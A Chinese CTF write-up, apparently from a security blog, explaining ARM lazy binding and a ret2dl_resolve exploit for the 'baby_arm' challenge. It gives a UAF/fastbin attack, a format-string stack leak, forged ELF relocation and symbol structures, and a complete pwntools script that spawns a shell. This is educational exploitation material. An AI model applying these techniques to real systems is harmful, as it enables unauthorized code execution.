# 记一次arm架构的ret to dl_resolve利用

阅读量 **1230927**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-01-08 11:00:05

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t0161ae30b8cbbd48db.jpg)

## 前记

想试试这个利用方式是因为今年Xman冬令营选拔赛上的一道题目`baby_arm`

    
    
    ➜  arm checksec pwn       
    [*] '/home/mask/Desktop/xman/arm/pwn'
        Arch:     arm-32-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x10000)
    

题目本身很简单，只是一个free后未置0的UAF

    
    
    int del_note()
    {
      int result; // r0
      int v1; // [sp+8h] [bp+8h]
    
      printf("Index :");
      read(0, &v1, 4u);
      result = atoi((const char *)&v1);
      if ( result < 0 || result >= count )
      {
        puts("Out of bound!");
        exit(0);
      }
      if ( notelist[result] )
      {
        free(notelist[result]);    // uaf
        result = puts("Done it");
      }
      return result;
    }
    

`fastbin attack`去劫持`notelist`便可以任意地址读写了

因为这是一道arm架构的题目，其libc也是arm的libc，当时无法找到远程libc的版本，所以没有拿到flag，后来有另外一位师傅给了一个多平台libc
search的网站<https://libc.nullbyte.cat/> ，以后遇到相应题目也能继续做下去了

赛时有考虑过`ret to dl_resolve`的做法，在网上查了下也没发现有相关的文章，当时也没有详细研究，这次趁着期末考前有空，仔细琢磨了一下

## 加载函数

先来看一下arm的程序是如何加载libc中的函数的

###  plt/got

就以`main`函数中的一个`puts`调用为例来分析

    
    
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      ...
      puts("Tell me your name:");
      ...
    }
    

汇编层面是这样的

    
    
    .text:00010A5A                 LDR             R3, =(aTellMeYourName - 0x10A60)
    .text:00010A5C                 ADD             R3, PC  ; "Tell me your name:"
    .text:00010A5E                 MOV             r0, R3  ; s
    .text:00010A60                 BLX             puts
                        ↓
    .plt:00010560 puts                                    ; CODE XREF: add_note+22↓p
    .plt:00010560                                         ; add_note+84↓p ...
    .plt:00010560                 ADR             r12, 0x10568
    .plt:00010564                 ADD             r12, r12, #0x10000
    .plt:00010568                 LDR             PC, [r12,#(puts_ptr - 0x20568)]! ; __imp_puts
                        ↓
    .plt:00010510 ; Segment type: Pure code
    .plt:00010510                 AREA .plt, CODE
    .plt:00010510                 ; ORG 0x10510
    .plt:00010510                 CODE32
    .plt:00010510                 STR             LR, [SP,#-4]!
    .plt:00010514                 LDR             LR, =_GLOBAL_OFFSET_TABLE_ ; PIC mode
    .plt:00010518                 NOP
    .plt:0001051C                 LDR             PC, [LR,#8]!
    

我们在gdb中跟进看看

![](https://p2.ssl.qhimg.com/t01aea4277ff9987915.png)

![](https://p2.ssl.qhimg.com/t01d88ae427060ff3a3.jpg)

这里的`ldr pc,[ip, #0xab8]!`（注意有一个`!`）的意思是`ip = ip + 0xab8, pc =
*ip`，此时`ip`寄存器指向了`puts[@got](https://github.com/got
"@got")`，然后`pc`读取`puts[@got](https://github.com/got
"@got")`的值，与x86架构一样，未加载的函数其GOT表上填的都是跳去`dl_resolve`的函数地址，也就是PLT表头的位置，于是程序就到了准备进入`dl_resolve`的地方`0x10510`位置处

![](https://p1.ssl.qhimg.com/t0198c7c9674592b77c.png)

在PLT表开头处的几条指令，`lr`寄存器指向了`GOT`表（在pwndbg中REGISTERS栏没有显示`lr`寄存器，不过可以用`p/x
$lr`来查看），下一条跳转指令`pc = *(lr +
8)`也就是跳去GOT表上存的一个地址，也就是`_dl_runtime_resolve`，注意这里的跳转指令也带有`!`，所以`lr`变成了GOT+8

![](https://p4.ssl.qhimg.com/t018be5db4a6205571c.jpg)

###  _dl_runtime_resolve

我们先查看一下arm的`_dl_runtime_resolve`源码，这是一段汇编代码，在`/sysdeps/arm/dl-trampoline.S`中，只关注主要代码

    
    
    _dl_runtime_resolve:
    
        @ we get called with
        @     stack[0] contains the return address from this call
        @    ip contains &GOT[n+3] (pointer to function)
        @    lr points to &GOT[2]
    
        @ Save arguments.  We save r4 to realign the stack.
        push    {r0-r4}
    
        @ get pointer to linker struct
        ldr    r0, [lr, #-4]
    
        @ prepare to call _dl_fixup()
        @ change &GOT[n+3] into 8*n        NOTE: reloc are 8 bytes each
        sub    r1, ip, lr
        sub    r1, r1, #4
        add    r1, r1, r1
    
        @ call fixup routine
        bl    _dl_fixup
    
        @ save the return
        mov    ip, r0
    
        @ get arguments and return address back.  We restore r4
        @ only to realign the stack.
        pop    {r0-r4,lr}
    
        @ jump to the newly found address
        BX(ip)
    

简单来说，进入`_dl_runtime_resolve`后，流程如下

  1. 先保存前五个寄存器（调用函数时传递的参数）
  2. 然后通过`lr`寄存器（此时是指向GOT+8）取得`link_map`的地址（保存在GOT+4），作为参数1，存在`r0`
  3. 计算函数的`reloc_arg`（可以在`_dl_fixup`的源码中查看），`reloc_arg = (ip - lr -4) / 2`
  4. 调用`_dl_fixup`函数
  5. 从函数中返回加载成功的函数地址（libc中），保存到`ip`
  6. 恢复寄存器（函数参数）
  7. 跳转到`ip`，即调用加载成功的函数

![](https://p3.ssl.qhimg.com/t014a77254e7f1904b7.jpg)

`link_map`是在libc中的，不过地址存在了程序中的GOT段，主要关注这个`reloc_arg`，那三行有关`r1`的指令，实现的是`r1 = 2
*(puts[@got](https://github.com/got "@got") - (GOT +8) - 4)`，值就是`0x28`

至此，就准备进入`_dl_fixup`

###  _dl_fixup

这个函数是在`ld.so`动态库中，相应源码在`/elf/dl-runtime.c`，挑出主要部分

    
    
    # define reloc_offset reloc_arg
    
    DL_FIXUP_VALUE_TYPE
    attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE
    _dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)
    {
      const ElfW(Sym) *const symtab = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
      // 获取程序中的 ELF Symbol Table
      const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);
      // 获取程序中的 ELF String Table
      const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset); 
      // 利用参数 reloc_offset(reloc_arg) 获取函数的 Elf32_Rel 结构体（程序中的 ELF JMPREL Relocation Table）
      // 查表方式是 reloc = ELF JMPREL Relocation Table Base + reloc_offset
      const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];  
      // 利用 reloc->r_info 获取函数的 Elf32_Sym 结构体 （程序中的 ELF Symbol Table）
      // 查表方式是 r_info 的高位字节代表了函数的 ELF32_Sym 结构体在 ELF Symbol Table 中的偏移（其实这里可以说是索引，这里记录是 0x10 大小作为一个单位）
      // 也就是说 sym = ELF Symbol Table Base + (r_info >> 8) * 0x10
      void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
    
      assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);
      // 这里会检查 reloc->r_info 的低位字节是否为 0x16 (针对arm的)
    
      if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
        {
          const struct r_found_version *version = NULL;
    
          if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL) // 针对这个程序的利用，这里需要bypass，下文会讲
        {
          const ElfW(Half) *vernum =  (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
          ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
          version = &l->l_versions[ndx];
          if (version->hash == 0)
            version = NULL;
        }
    
          result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL);
          // 根据 strtab + sym->st_name 处的字符串，通过 _dl_lookup_symbol_x 去加载函数，返回值是 libc的基址
    
          value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym->st_value) : 0);
          // 得到函数真实地址
        }
    
      return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);
      // 修改函数 GOT 表，返回真实地址
    }
    

跟着流程走一遍

    
    
    const ElfW(Sym) *const symtab = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
    // 获取程序中的 ELF Symbol Table
    const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);
    // 获取程序中的 ELF String Table
    

这里从`link_map`中获取`symtab`与`strtab`两个表，这两个表是存在ELF文件上的

![](https://p0.ssl.qhimg.com/t01c0d27ad021f30554.png)

![](https://p3.ssl.qhimg.com/t01701972cfd9ad09f5.png)

可以发现这个ELF中调用的函数都在这里罗列了出来，程序正是利用这些表中的结构体去加载函数的，这也是`ret to dl_resolve`攻击的主要利用点

    
    
    const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset); 
    // 利用参数 reloc_offset(reloc_arg) 获取函数的 Elf32_Rel 结构体（程序中的 ELF JMPREL Relocation Table）
    // 查表方式是 reloc = ELF JMPREL Relocation Table Base + reloc_offset
    

这一句通过传进`_dl_fixup`的第二个参数，来从`JMPREL`中获得将要调用的函数的`Elf32_Rel`结构体，`ELF JMPREL
Relocation Table`这个表也是在ELF文件中

![](https://p2.ssl.qhimg.com/t01ecb9f6ef0f138cb9.png)

![](https://p1.ssl.qhimg.com/t012d6ab9ac469a1fb3.png)

上面提到了，调用`puts`时，传进来的值时`0x28`，按照宏定义运算，得到的`Elf32_Rel`结构体地址应为`0x10494 + 0x28 =
0x104bc`，得到`Elf32_Rel <0x21020, 0x616> ; R_ARM_JUMP_SLOT
puts`这个结构，`Elf32_Rel`结构体定义如下

    
    
    typedef struct {
            Elf32_Addr r_offset;    
            Elf32_Word r_info;     
        } Elf32_Rel;
    
    
    
    const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];  
    // 利用 reloc->r_info 获取函数的 Elf32_Sym 结构体 （程序中的 ELF Symbol Table）
    // 查表方式是 r_info 的高位字节代表了函数的 ELF32_Sym 结构体在 ELF Symbol Table 中的偏移（其实这里可以说是索引，这里记录是以 0x10 大小作为一个单位）
    // 也就是说 sym = ELF Symbol Table Base + (r_info >> 8) << 4
    

![](https://p3.ssl.qhimg.com/t01d0802b643439a2ce.png)

利用`reloc`来获取函数的`Elf32_Sym`结构体，按照宏定义运算，得到的`Elf32_Sym`结构体地址应为`0x10214 + (0x616
>> 8) << 4 = 0x10214 + 0x60 = 0x10274`，得到`Elf32_Sym <aPuts - byte_10334, 0, 0,
0x12, 0, 0> ; "puts"`这个结构体，`Elf32_Sym`结构定义如下

    
    
    typedef uint32_t Elf32_Addr;
        typedef uint32_t Elf32_Word;
        typedef struct
        {
            Elf32_Word st_name;     
            Elf32_Addr st_value;   
            Elf32_Word st_size;    
            unsigned char st_info; 
            unsigned char st_other;
            Elf32_Section st_shndx;
        } Elf32_Sym;
    

`st_name`是函数名相对于`strtab`的偏移，按照我们得到的结构体来说，这个数值为`0x1a`，得到的函数名字符串所在地址为`0x10334 +
0x1a = 0x1034e`，正好为`puts`

    
    
    assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);
    // 这里会检查 reloc->r_info 的低位字节是否为 0x16 (针对arm的)
    

这里会对`Elf32_Rel`中的`r_info`进行一个check，x86中`r_info`的低位是`0x7`而arm中这里应为`0x16`

    
    
    result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL);
    // 根据 strtab + sym->st_name 处的字符串，通过 _dl_lookup_symbol_x 去加载函数，返回值是 libc的基址
    

这一处就是按照前面准备好的各种结构体，去加载函数，返回libc基址，调用`_dl_lookup_symbol_x`时

![](https://p4.ssl.qhimg.com/t01599986f9dbc1d896.png)

注意第三个参数 `&sym`，这里是`sym`变量的地址`0xf6ffed4c`，放在栈上

![](https://p2.ssl.qhimg.com/t01a4162118d09a8ec6.png)

执行完这个函数，返回的只是libc的基址，那么我们想要调用的加载的地址在哪里呢？

其实在`_dl_lookup_symbol_x`中把`sym`的`st_value`修改成了加载函数相对于libc基址的偏移

![](https://p5.ssl.qhimg.com/t011a49c2a3b7f33e02.png)

这里提一下，在vmmap出来的地址与真实的函数偏移基址差了`0x1000`，这与x86上的情况不大一样，不知道是什么原因

![](https://p0.ssl.qhimg.com/t018880c97d8a3e968d.png)

    
    
    value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym->st_value) : 0);
    // 得到函数真实地址
    

接着就利用libc基址与函数偏移得到函数真实地址

    
    
    return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);
    // 修改函数 GOT 表，返回真实地址
    

加载了函数以后，再调用就直接通过GOT表找到函数真实地址了

![](https://p3.ssl.qhimg.com/t01c1c559aa29258aa5.png)

![](https://p1.ssl.qhimg.com/t010dd0f70d981e3781.png)

到此位置，arm中动态加载函数的流程已经走完了，下面针对这道题目谈谈如何利用

## 利用思路

这道题本身是一道可以任意地址读写的题目，在假设不知道libc的情况下，使用`ret to dl_resolve`应该是一个很好的办法

在以往x86上的`ret to
dl_resolve`利用，无非是栈转移到bss段再进行ROP，可是我没有发现arm上有关栈转移的操作（有些文章说arm有sp和fp寄存器，但是针对这题貌似没有发现，可能是arm的其他类型），然后我也没发现有栈溢出的地方

回归到任意地址读写的功能上，我们可以修改函数GOT表从而达到执行任意地址代码（地址确保是可执行的），找一下`gadget`

![](https://p1.ssl.qhimg.com/t01b7602c5bc7e72b7a.png)

发现`__libc_csu_init`里的一个`pop`可以控制各寄存器然后跳到`pc`处，只要修改某个函数的GOT表为这个`gadget`即可

回想一下在`_dl_runtime_resolve`前，函数GOT表地址是存在`ip`寄存器的，同时`lr`寄存器指向GOT+8，所以我们可以利用这个`gadget`控制`lr`，`ip`与`pc`，从而可以自定义加载函数

那么问题就到了如何控制栈上对应位置进行`pop`，利用任意地址写是可行的，但是我们不知道栈地址

如何来leak栈地址，我在这里取巧了，通过任意地址写来修改`puts[@got](https://github.com/got
"@got")`为`printf[@plt](https://github.com/plt
"@plt")`，进而实现了格式化字符串漏洞利用，泄漏了stack，进入对栈上数据进行修改

这里要注意函数栈帧的重合，在利用时进行一次`pop`发现`edit`函数的返回地址被破坏了，于是我多进行了一次`pop`，避开了当前函数的栈帧，同时也控制了`lr`，`ip`与`pc`

![](https://p0.ssl.qhimg.com/t01f70e986a6f75b66b.png)

![](https://p3.ssl.qhimg.com/t012ab4432db5fdefc1.png)

剩下伪造`fake_got`，`fake_ELF32_Rel`和`fake_ELF32_Sym`了，还是利用任意地址写在bss上写下这两个结构体

![](https://p4.ssl.qhimg.com/t01378fc32cf22fdf13.png)

`fake_got`的计算方式是`ELF JMPREL Relocation Table + (fake_got - (GOT + 8) - 4) * 2
= fake_ELF32_Rel`，所以`fake_got = (0x210b4 - 0x10494) * 2 + 0x21008 + 4 =
0x2961c`

`fake_ELF32_Rel->r_offset`是待加载函数的GOT表，这里随便填了一个`free[@got](https://github.com/got
"@got")`，不影响

`fake_ELF32_Rel->r_info`是`fake_ELF32_Sym`相对`ELF Symbol
Table`的索引，再加上架构check的`0x16`，就是`r_info = ((0x210c4 - 0x10214) >> 4) << 8 ^ 0x16
= 0x10eb16`

`fake_ELF32_Sym->st_name`是待加载函数名相对于`ELF String
Table`的偏移，这里调用`system`，写在了bss上，于是值为`st_name = 0x210bc - 0x10334 = 0x10d88`

东西都准备好了，接着就`ret to dl_resolve`

![](https://p0.ssl.qhimg.com/t01d0aca3c51d13f118.png)

准备进入`_dl_resolve`，此时`r0`是待调用函数的参数，`IP`是我们伪造的`fake_got`

![](https://p4.ssl.qhimg.com/t01f009a4e10e4d1547.png)

准备进入`_dl_fixup`，`r1`是`fake_ELF32_Rel`的偏移

![](https://p0.ssl.qhimg.com/t017b363ce4cc27cc7c.png)

继续执行下去，会发现一处`SIGSEGV`，原因是读到了错误地址

![](https://p2.ssl.qhimg.com/t01684d02ccc85cb6f5.png)

看前几条指令，可以发现bypass的地方

![](https://p4.ssl.qhimg.com/t0146fb87b6d6d70e83.png)

正好这里的`r0`是`link_map`，地址存在GOT上，只需读出地址，修改`link_map +
0xe4`处为0就行了，这里的代码对应`_dl_fixup`中这一段

    
    
     if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL) // 针对这个程序的利用，这里需要bypass
        {
          const ElfW(Half) *vernum =  (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
          ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff; // reloc->r_offset 太大
          version = &l->l_versions[ndx];
          if (version->hash == 0)
            version = NULL;
        }
    

绕过这一处后，就到了`_dl_lookup_symbol_x`，只要这里解析成功，剩下的就完事了

![](https://p2.ssl.qhimg.com/t0160bf11f35cc7580f.png)

利用成功

![](https://p1.ssl.qhimg.com/t018d89134ef5b41f4f.png)

## 完整EXP

利用流程如下

  1. UAF + Fastbin Attack 控制`notelist`
  2. 修改`puts[@got](https://github.com/got "@got")`为`printf[@plt](https://github.com/plt "@plt")`实现格式化字符串漏洞利用泄漏栈地址
  3. 读取`link_map`地址，并修改`[ink_map + 0xe4] = 0`
  4. 栈上布置`fake_ELF32_Rel`与`fake_ELF32_Sym`
  5. 修改栈上数据实现`ret to dl_resolve`
  6. Get Shell

    
    
    # encoding:utf-8
    from pwn import *
    context.log_level = 'debug'
    context.terminal = ['tmux', 'splitw', '-h']
    libc = ELF("/usr/arm-linux-gnueabihf/lib/libc.so.6")
    e = ELF("./pwn")
    rlibc = ''
    ip = ''
    port = ''
    debug = False
    
    
    def dbg(code=""):
        global debug
        if debug == False:
            return
        gdb.debug()
    
    
    def run(local):
        global p, libc, debug
        if local == 1:
            debug = True
            # p = process(["qemu-arm", "-g", "1111", "-L", "/usr/arm-linux-gnueabihf", "./pwn"])
            p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./pwn"])
        else:
            p = remote(ip, port)
            debug = False
            if rlibc != '':
                libc = ELF(rlibc)
    
    
    se = lambda x: p.send(x)
    sl = lambda x: p.sendline(x)
    sea = lambda x, y: p.sendafter(x, y)
    sla = lambda x, y: p.sendlineafter(x, y)
    rc = lambda: p.recv(timeout=0.5)
    ru = lambda x: p.recvuntil(x, drop=True)
    rn = lambda x: p.recv(x)
    shell = lambda: p.interactive()
    un64 = lambda x: u64(x.ljust(8, 'x00'))
    un32 = lambda x: u32(x.ljust(4, 'x00'))
    
    def add(size, c):
        sla("choice:", '1')
        sla(":", str(size))
        sea(":", c)
        #sleep(0.5)
    
    def delete(idx):
        sla("choice:", '2')
        sla(":", str(idx))
        #sleep(0.5)
    
    def show(idx):
        sla("choice:", '3')
        sla("Index :", str(idx))
    
    def edit(idx,c):
        sla("choice:", '5')
        sla(":", str(idx))
        sea(":", c)
        #sleep(0.5)
    
    note_list = 0x21088
    Sym_offset = 0x10eb
    name_offset = 0x10d88
    fake_got = 0x2961c
    gadget = 0x10b20
    
    fake_ELF32_Rel = ""
    fake_ELF32_Rel += p32(e.got['free'])
    fake_ELF32_Rel += p32((Sym_offset << 8) ^ 0x16)
    
    fake_ELF32_Sym = ""
    fake_ELF32_Sym += p32(name_offset)
    fake_ELF32_Sym += p32(0) * 2
    fake_ELF32_Sym += p32(0x12)
    
    run(1)
    sea(":", "Mask".ljust(0x1c, 'x00') + p32(0x31))
    add(0x28, '0')
    add(0x28, '1')
    add(0x28, '2')
    add(0x28, '3')
    add(0x28, '4')
    add(0x28, '5')
    add(0x28, '6')
    add(0x28, '%10$p;/bin/sh')
    delete(2)
    delete(3)
    delete(2)
    add(0x28, p32(0x21078 + 8))
    add(0x28, '5')
    add(0x28, p32(0x21078 + 8))
    add(0x28, p32(note_list) + p32(e.got['puts']))
    # UAF + Fastbin Attack 控制notelist
    edit(1, p32(0x010524))
    show(7)
    stack = int(rn(10), 16) - 0x20
    # 修改puts@got为printf@plt实现格式化字符串漏洞利用泄漏栈地址
    edit(0, p32(e.got['free']) + p32(stack + 0x24) + p32(stack + 0x24 + 0x20) + p32(note_list + 0x10))
    edit(3, p32(note_list + 0x2c) + p32(note_list + 0x3c) + p32(0x21004))
    show(6)
    link_map = un32(rn(4))
    edit(3, p32(note_list + 0x2c) + p32(note_list + 0x3c) + p32(link_map + 0xe4))
    edit(6, p32(0))
    # 读取link_map地址，并修改[ink_map + 0xe4] = 0
    edit(4, fake_ELF32_Rel + 'system'.ljust(0x8, 'x00'))
    edit(5, fake_ELF32_Sym)
    # 栈上布置fake_ELF32_Rel与fake_ELF32_Sym
    edit(0, p32(gadget))
    edit(1, p32(gadget) + p32(0x666) * 3)
    edit(2, p32(fake_got) + p32(0x10a65) + p32(0x10510))
    delete(7)
    # 修改栈上数据实现ret to dl_resolve
    shell()
    # Get Shell
    

写的不好，希望各位大佬多多谅解~

pwn文件与脚本下载地址

链接: <https://pan.baidu.com/s/1BDiDMV5nc7J4BU-R4S4wLw> 提取码: tbci

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Mask6asok** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/196442](/post/id/196442)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [CTF](/tag/CTF)
  * [arm](/tag/arm)

 **+1** __3赞

 __收藏

![](https://p5.ssl.qhimg.com/t010857340ce46bb672.jpg) Mask6asok

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

